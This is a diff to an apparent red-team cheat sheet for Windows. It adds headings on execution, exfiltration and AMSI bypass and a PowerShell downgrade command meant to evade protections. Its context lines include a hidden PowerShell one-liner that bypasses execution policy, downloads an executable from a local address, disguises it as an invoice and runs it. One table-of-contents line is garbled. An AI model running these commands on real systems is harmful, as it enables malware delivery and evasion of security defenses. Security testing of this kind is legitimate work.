@@ -5,13 +5,18 @@
   * [Initial Access](#initial-access)
   * [Host Enumeration](#host-enumeration)
   * [Domain Enumeration](#domain-enumeration)
+  * [Execution](#execution).exe -version 2
   * [Persistence](#persistence)
     * [COM Hijacking](#com-hijacking)
     * [DLL Hijacking](#dll-hijacking)
   * [Privilege Escalation](#privilege-escalation)
     * [Unquoted Service Path](#unquoted-service-path)
   * [Lateral Movement](#lateral-movement)
+  * [Exfiltration](#exfiltration)
   * [Misc](#misc)
+    * [PowerShell](#powershell)
+      * [PowerShell Downgrade](#powershell-downgrade)
+      * [AMSI Bypass](#amsi-bypass)
 <!--te-->
 
 # **Persistence**
@@ -103,4 +108,13 @@ $vulnerable_paths
 
 ```
 powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
+```
+
+## **PowerShell**
+
+### **PowerShell Downgrade**
+
+```
+# Downgrade PowerShell to Version 2 which has less protections
+powershell -version 2
 ```
